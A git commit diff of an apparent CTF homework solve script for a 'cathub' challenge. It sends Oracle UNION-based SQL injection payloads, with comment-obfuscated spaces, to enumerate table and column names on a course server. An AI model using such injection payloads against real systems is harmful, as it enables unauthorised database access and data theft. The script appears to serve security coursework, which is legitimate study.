9bf602ddc7995ce0e0ff914f084d39cc0dcc442b
Alfons0329 <alfons.cs04@g2.nctu.edu.tw>
2019-11-13 02:42:50 +0800

    AC cathub, add script, writeup tomorrow

--- Hw0x04/cathub/solve.py
+++ Hw0x04/cathub/solve.py
@@ -2,8 +2,8 @@ import requests
 import urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-#url = 'https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,table_name,null/**/from/**/(SELECT/**/ROWNUM/**/r,table_name/**/FROM/**/all_tables/**/ORDER/**/BY/**/table_name)/**/where/**/r=' # find secret table 
-url = 'https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,column_name,null/**/from/**/(SELECT/**/ROWNUM/**/r,column_name/**/FROM/**/all_tab_columns/**/ORDER/**/BY/**/column_name)/**/where/**/r=' # find secret column
+url = 'https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,table_name,null/**/from/**/(SELECT/**/ROWNUM/**/r,table_name/**/FROM/**/user_tables/**/ORDER/**/BY/**/table_name)/**/where/**/r=' # find secret table 
+# url = 'https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,column_name,null/**/from/**/(SELECT/**/ROWNUM/**/r,column_name/**/FROM/**/user_tab_columns/**/ORDER/**/BY/**/column_name)/**/where/**/r=' # find secret column
 
 for row_num in range(1, 1000):
 
@@ -13,5 +13,5 @@ for row_num in range(1, 1000):
     if 'Error' not in result.text and 'Bad cat!' not in result.text:
         splittext = result.text.splitlines()
         for each_row in splittext:
-            if 'S3CRET' in each_row and len(each_row) != 13:
+            if '<h2>' in each_row:
                 print(each_row, '\t --> row_num %d '%(row_num))
